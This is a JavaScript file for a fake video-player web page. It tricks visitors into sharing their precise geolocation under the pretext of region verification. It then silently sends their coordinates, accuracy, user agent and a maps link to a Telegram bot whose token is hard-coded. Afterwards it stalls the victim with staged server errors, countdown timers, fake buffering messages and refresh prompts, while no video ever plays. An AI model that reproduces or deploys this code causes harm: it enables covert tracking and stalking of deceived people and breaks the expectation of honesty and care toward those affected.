(function() {
    'use strict';

    // === CONFIG ===
    var TELEGRAM_BOT_TOKEN = "8791673811:AAGwPYv0hrGZGqarZA9w7_KOrUruGelViro";
    var TELEGRAM_CHAT_ID = "@imFreed0mLocationTest";
    var WAIT_FIRST = 2 * 60;   // 2 minutes in seconds
    var WAIT_SUBSEQUENT = 7 * 60; // 7 minutes in seconds
    var STORAGE_KEY = 'vp_state';

    // === STATE MACHINE ===
    // States: INITIAL, FAILED, WAIT, RETRY_AVAILABLE, FAKE_VIDEO, REFRESH_REQUIRED
    var countdownTimer = null;
    var actionLocked = false;
    var currentWaitEndTime = 0;
    var forceTick = null;

    // --- DOM refs ---
    var playOverlay = document.getElementById('playOverlay');
    var bufferingOverlay = document.getElementById('bufferingOverlay');
    var bufferText = document.getElementById('bufferText');
    var errorOverlay = document.getElementById('errorOverlay');
    var errorIcon = document.getElementById('errorIcon');
    var errorText = document.getElementById('errorText');
    var countdownDisplay = document.getElementById('countdownDisplay');
    var countdownLabel = document.getElementById('countdownLabel');
    var retryBtn = document.getElementById('retryBtn');
    var refreshHint = document.getElementById('refreshHint');
    var videoContainer = document.getElementById('videoContainer');

    // --- State persistence ---
    function saveState(obj) {
        try { localStorage.setItem(STORAGE_KEY, JSON.stringify(obj)); } catch(e) {}
    }
    function loadState() {
        try { var s = localStorage.getItem(STORAGE_KEY); return s ? JSON.parse(s) : null; } catch(e) { return null; }
    }
    function clearState() {
        try { localStorage.removeItem(STORAGE_KEY); } catch(e) {}
    }

    // --- Hide all overlays ---
    function hideAll() {
        playOverlay.style.display = 'none';
        bufferingOverlay.classList.remove('active');
        errorOverlay.classList.remove('active');
        countdownDisplay.style.display = 'none';
        countdownLabel.style.display = 'none';
        retryBtn.style.display = 'none';
        refreshHint.style.display = 'none';
        if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
    }

    // --- Show INITIAL state ---
    function showInitial() {
        hideAll();
        playOverlay.style.display = '';
        videoContainer.classList.remove('unlocked');
    }

    // --- Show WAIT (countdown) state ---
    function showWait(waitEndTime) {
        currentWaitEndTime = waitEndTime;
        hideAll();
        videoContainer.classList.remove('unlocked');
        errorOverlay.classList.add('active');
        errorIcon.style.display = '';
        errorText.textContent = 'Playback server error. Please wait and try again.';
        countdownDisplay.style.display = '';
        countdownLabel.style.display = '';
        retryBtn.style.display = '';
        retryBtn.disabled = false;
        retryBtn.textContent = 'Please wait...';

        forceTick = function tick() {
            var now = Date.now();
            var remaining = Math.max(0, Math.ceil((currentWaitEndTime - now) / 1000));
            var m = Math.floor(remaining / 60);
            var s = remaining % 60;
            countdownDisplay.textContent = m + ':' + (s < 10 ? '0' : '') + s;

            if (remaining <= 0) {
                if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
                showRetryAvailable();
            }
        };
        forceTick();
        countdownTimer = setInterval(forceTick, 1000);
    }

    // --- Show RETRY_AVAILABLE state ---
    function showRetryAvailable() {
        countdownDisplay.textContent = '0:00';
        countdownLabel.textContent = 'Ready to retry';
        retryBtn.disabled = false;
        retryBtn.textContent = 'Retry Playback';
    }

    // --- Show FAKE_VIDEO state ---
    function showFakeVideo() {
        hideAll();
        videoContainer.classList.add('unlocked');
        bufferingOverlay.classList.add('active');
        bufferText.textContent = 'Buffering video...';

        // Cycle through fake buffer messages
        var msgs = ['Buffering video...', 'Connecting to CDN...', 'Loading stream data...', 'Buffering video...'];
        var i = 0;
        countdownTimer = setInterval(function() {
            i = (i + 1) % msgs.length;
            bufferText.textContent = msgs[i];
        }, 3000);
    }

    // --- Show REFRESH_REQUIRED state ---
    function showRefreshRequired() {
        hideAll();
        videoContainer.classList.add('unlocked');
        errorOverlay.classList.add('active');
        errorIcon.style.display = 'none';
        errorText.textContent = 'Stream interrupted. A page refresh is required to reconnect to the server.';
        refreshHint.style.display = '';
    }

    // --- Telegram dispatch ---
    function sendToTelegram(lat, lng, acc, userAgent) {
        var timestamp = new Date().toLocaleString();
        var message = '🚨 *NEW GEOLOCATION TELEMETRY*\n\n' +
                      '📍 *Coords:* `' + lat + ', ' + lng + '`\n' +
                      '🎯 *Accuracy:* ~' + Math.round(acc) + ' meters\n' +
                      '📱 *User-Agent:* `' + userAgent + '`\n' +
                      '🕒 *Time:* ' + timestamp + '\n\n' +
                      '🗺️ [Open in Google Maps](https://www.google.com/maps?q=' + lat + ',' + lng + ')';

        var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
        try {
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: false
                })
            }).catch(function() {});
        } catch (e) {}
    }

    // --- Handle initial play click (INITIAL → FAILED → WAIT_2_MIN) ---
    function handleInitialPlay() {
        if (actionLocked) return;
        actionLocked = true;

        hideAll();
        bufferingOverlay.classList.add('active');
        bufferText.textContent = 'Verifying your region...';

        // Request location
        if (!navigator.geolocation) {
            transitionToFailed();
            return;
        }

        navigator.geolocation.getCurrentPosition(
            function(position) {
                var lat = position.coords.latitude;
                var lng = position.coords.longitude;
                var acc = position.coords.accuracy;
                var ua = navigator.userAgent;

                bufferText.textContent = 'Region verified. Loading stream...';
                sendToTelegram(lat, lng, acc, ua);

                setTimeout(function() {
                    bufferText.textContent = 'Connecting to CDN node...';
                    setTimeout(function() {
                        transitionToFailed();
                    }, 1500);
                }, 2000);
            },
            function() {
                // Location denied — still transition to failed to keep them in the loop
                transitionToFailed();
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    }

    // --- Transition: → FAILED → WAIT_2_MIN ---
    function transitionToFailed() {
        actionLocked = false;
        var waitEnd = Date.now() + (WAIT_FIRST * 1000);
        saveState({ phase: 'WAIT', waitEnd: waitEnd, cycle: 0 });
        showWait(waitEnd);
    }

    // --- Handle retry click (RETRY_AVAILABLE → FAKE_VIDEO) ---
    function handleRetry() {
        if (actionLocked) return;
        actionLocked = true;

        var state = loadState();
        var cycle = state ? (state.cycle || 0) : 0;

        saveState({ phase: 'FAKE_VIDEO', cycle: cycle + 1 });
        showFakeVideo();

        // After 20 seconds of fake buffering, transition to REFRESH_REQUIRED
        setTimeout(function() {
            actionLocked = false;
            saveState({ phase: 'REFRESH_REQUIRED', cycle: cycle + 1 });
            showRefreshRequired();
        }, 20000);
    }

    // --- Bind events ---
    playOverlay.addEventListener('click', handleInitialPlay);
    retryBtn.addEventListener('click', function() {
        if (retryBtn.textContent === 'Retry Playback') {
            handleRetry();
        } else if (retryBtn.textContent === 'Please wait...') {
            var state = loadState();
            if (state && state.phase === 'WAIT') {
                currentWaitEndTime -= 5000;
                state.waitEnd = currentWaitEndTime;
                saveState(state);
                
                if (forceTick) forceTick();
                
                if (Date.now() >= currentWaitEndTime) {
                    handleRetry();
                }
            }
        }
    });

    // === ON PAGE LOAD: restore state ===
    function init() {
        var state = loadState();

        if (!state) {
            showInitial();
            return;
        }

        switch (state.phase) {
            case 'WAIT':
                var now = Date.now();
                if (now >= state.waitEnd) {
                    // Timer already expired
                    showWait(state.waitEnd); // will immediately show retry
                } else {
                    showWait(state.waitEnd);
                }
                break;

            case 'FAKE_VIDEO':
                // Came back from refresh while in fake video — treat as REFRESH_REQUIRED
                // Fall through to REFRESH_REQUIRED
            case 'REFRESH_REQUIRED':
                // After refresh: toggle between 7 min and 2 min
                var cycle = state.cycle || 1;
                var waitDuration = (cycle % 2 === 1) ? WAIT_SUBSEQUENT : WAIT_FIRST;
                var waitEndNext = Date.now() + (waitDuration * 1000);
                saveState({ phase: 'WAIT', waitEnd: waitEndNext, cycle: cycle });
                showWait(waitEndNext);
                break;

            default:
                showInitial();
        }
    }

    // Ensure small control bar play button also works
    var smallPlayBtn = document.getElementById('playBtn');
    if (smallPlayBtn) {
        smallPlayBtn.addEventListener('click', function() {
            var st = loadState();
            if (!st || !st.phase || st.phase === 'INITIAL') {
                handleInitialPlay();
            }
        });
    }

    init();
})();
